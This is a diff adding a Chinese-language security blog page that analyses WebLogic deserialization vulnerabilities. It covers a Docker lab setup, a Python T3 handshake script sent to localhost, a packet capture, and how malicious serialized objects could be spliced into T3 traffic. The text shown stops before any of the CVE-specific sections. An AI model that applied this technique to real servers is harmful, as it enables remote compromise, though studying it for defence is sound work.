@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
+    <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="介绍WebLogic_是美国Oracle公司出品的一个application server,确切的说是一个基于JAVAEE架构的中间件。 主要用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。在weblogic中反序列化漏洞主要分为两种，一种是基于T3协议的反序列化漏洞，还一种是基于XML的反序列化漏洞。 基于T3协议漏洞： CVE-2015-4582、CV">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Weblogic反序列化">
+<meta property="og:url" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Oceanzbz&#39;s Blog">
+<meta property="og:description" content="介绍WebLogic_是美国Oracle公司出品的一个application server,确切的说是一个基于JAVAEE架构的中间件。 主要用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。在weblogic中反序列化漏洞主要分为两种，一种是基于T3协议的反序列化漏洞，还一种是基于XML的反序列化漏洞。 基于T3协议漏洞： CVE-2015-4582、CV">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612013253256.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612013359668.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612013638609.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612154921485.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612155112022.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612155117798.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612182848988.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612221920469.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612222605856.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612223130271.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612174402108.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612175912065.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612180620926.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612181748512.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612182104387.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612182554838.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612182645330.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612182744934.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612231146585.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612231514572.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612231609745.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612233027545.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612233039309.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612233342687.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612235455088.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612235645502.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612235728160.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612235829729.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612235856790.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613000031882.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613000117671.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613000310454.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613000346065.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613123924444.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613224117201.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613224231012.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613224251628.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613224825538.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613224847241.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613224901040.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250615212849082.png">
+<meta property="article:published_time" content="2025-06-11T11:41:45.000Z">
+<meta property="article:modified_time" content="2025-06-15T14:03:54.222Z">
+<meta property="article:author" content="Oceanzbz">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="Weblogic">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612013253256.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Weblogic反序列化</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-QWTJSPQL4F');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Oceanzbz&#39;s Blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/link/">Friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/06/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Diamond/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=Weblogic反序列化"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Weblogic反序列化"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=Weblogic反序列化"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Weblogic反序列化&body=Check out this article: https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Weblogic反序列化"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Weblogic反序列化"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Weblogic反序列化"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Weblogic反序列化"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=Weblogic反序列化&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=Weblogic反序列化"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#T3%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">T3协议分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B"><span class="toc-number">3.1.</span> <span class="toc-text">反序列化流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2015-4852"><span class="toc-number">4.</span> <span class="toc-text">CVE-2015-4852</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-0638"><span class="toc-number">5.</span> <span class="toc-text">CVE-2016-0638</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-3510"><span class="toc-number">6.</span> <span class="toc-text">CVE-2016-3510</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-3248"><span class="toc-number">7.</span> <span class="toc-text">CVE-2017-3248</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2018-2628"><span class="toc-number">8.</span> <span class="toc-text">CVE-2018-2628</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E7%BB%95%E8%BF%87"><span class="toc-number">8.1.</span> <span class="toc-text">第一种绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E7%BB%95%E8%BF%87"><span class="toc-number">8.2.</span> <span class="toc-text">第二种绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2018-2893"><span class="toc-number">9.</span> <span class="toc-text">CVE-2018-2893</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2018-3245"><span class="toc-number">10.</span> <span class="toc-text">CVE-2018-3245</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2018-3191"><span class="toc-number">11.</span> <span class="toc-text">CVE-2018-3191</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EXML"><span class="toc-number">12.</span> <span class="toc-text">基于XML</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Weblogic反序列化
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Oceanzbz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-11T11:41:45.000Z" class="dt-published" itemprop="datePublished">2025-06-11</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Weblogic/" rel="tag">Weblogic</a>, <a class="p-category" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>WebLogic_是美国Oracle公司出品的一个application server,确切的说是一个基于JAVAEE架构的中间件。 主要用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。在weblogic中反序列化漏洞主要分为两种，一种是基于T3协议的反序列化漏洞，还一种是基于XML的反序列化漏洞。</p>
+<p>基于T3协议漏洞： CVE-2015-4582、CVE-2016-0638、CVE-2016-3510、CVE-2018-2628、CVE-2020-2555、CVE-2020-2883<br>基于XML:CVE-2017-3506、CVE-2017-10271、CVE-2019-2729</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/WeblogicEnvironment">漏洞环境地址</a><br><a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html">jdk地址</a><br><a target="_blank" rel="noopener" href="http://download.oracle.com/otn/nt/middleware/11g/wls/1036/wls1036_generic.jar">weblogic下载地址</a><br>利用docker进行build，然后在run起来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk7u21 .</span><br><span class="line"></span><br><span class="line">docker run -it -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21 /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>我这里搭建环境出来点问题，需要自己改改dockerfile文件，就是换一下镜像为roboxes&#x2F;centos8，然后手动进去跑一下脚本就可以了。</p>
+<p>然后用idea创建一个空项目将wlserver&#x2F;server&#x2F;lib导入进来同时把其他的jar也都加入到项目中的lib中方便调试</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612013253256.png" class="">
+
+<p>然后创建远程调试</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612013359668.png" class="">
+
+<p>之后下个在反序列化的位置下一个断点，然后用漏洞扫描工具扫描一下，发现可以断下来成功</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612013638609.png" class="">
+
+<h2 id="T3协议分析"><a href="#T3协议分析" class="headerlink" title="T3协议分析"></a>T3协议分析</h2><p>RMI通信传输反序列化数据，接收数据后进行反序列化，正常RMI通信使用的是JRMP协议，而在Weblogic的RMI通信中使用的是T3协议。T3协议是Weblogic独有的一个协议，相比于JRMP协议多了一些特性。以下是T3协议的特点：</p>
+<ol>
+<li>服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。</li>
+<li>通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。</li>
+</ol>
+<p>使用python写一个跟weblogic通信的脚本，然后抓包</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T3Test</span>(<span class="params">ip,port</span>):  </span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </span><br><span class="line">    sock.connect((ip, port))  </span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span> <span class="comment">#请求包的头  </span></span><br><span class="line">    sock.sendall(handshake.encode())  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)  </span><br><span class="line">        <span class="built_in">print</span>(data.decode())  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    ip = <span class="string">&quot;localhost&quot;</span>  </span><br><span class="line">    port = <span class="number">7001</span>  </span><br><span class="line">  </span><br><span class="line">    T3Test(ip,port)</span><br></pre></td></tr></table></figure>
+
+<p>利用tcpdump抓个包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i lo0 tcp port 7001 and host 127.0.0.1 -w output_7001.pcap</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612154921485.png" class="">
+
+<p>可以发现webloigc返回给我们的报文，里面包括了一些版本信息，这里有2张图</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612155112022.png" class="">
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612155117798.png" class="">
+
+<p>第二到第七部分内容，开头都是ac ed 00 05，说明这些都是序列化的数据。只要把其中一部分替换成我们的序列化数据就可以了，有两种替换方式</p>
+<ol>
+<li>将weblogic发送的JAVA序列化数据的第二到九部分的JAVA序列化数据的任意一个替换为恶意的序列化数据。</li>
+<li>将weblogic发送的JAVA序列化数据的第一部分与恶意的序列化数据进行拼接。</li>
+</ol>
+<h3 id="反序列化流程"><a href="#反序列化流程" class="headerlink" title="反序列化流程"></a>反序列化流程</h3><p>这是一张网上的图写的很好</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612182848988.png" class="">
+
+
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612221920469.png" class="">
+
+<p>来看一下readClassDesc函数的逻辑，Java序列化的时候，java序列化数据在流量传输，并不是随随便便杂乱无章的，序列化数据的格式是要遵循序列化流协议。</p>
+<p>序列化流协议定义了字节流中传输的对象的基本结构。(包括类，字段，写入的数据等)<br>字节流中对象的表示可以用一定的语法格式来描述。</p>
+<p>比如说在字节流中传递的序列化数据中，字符串有字符串类型的特定格式、对象有对象类型的特定格式、类结构有着类结构。而TC_STRING、TC_OBJECT、TC_CLASSDESC则是他们的描述符，他们标识了接下来这段字节流中的数据是什么类型格式的。</p>
+<p>这样我们就很容易明白上图中的switch语句中各个case后面字段的意思了，通过字节流中的描述符来确定传递的数据类型，并交给对应方法去处理。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TC_NULL描述符表示空对象引用</span><br><span class="line">TC_REFERENCE描述符表示引用已写入流的对象</span><br><span class="line">TC_PROXYCLASSDESC是新的代理类描述符</span><br><span class="line">TC_CLASSDESC是新的类描述符</span><br></pre></td></tr></table></figure>
+
+<p>有关反序列化我们只需要关注<code>TC_PROXYCLASSDESC</code>和<code>TC_CLASSDESC</code>这两种就可以了，也就是分别对应<code>readNonProxyDesc</code>和<code>readProxyDesc</code></p>
+<p>首先来看看<code>readNonProxyDesc</code>方法</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612222605856.png" class="">
+
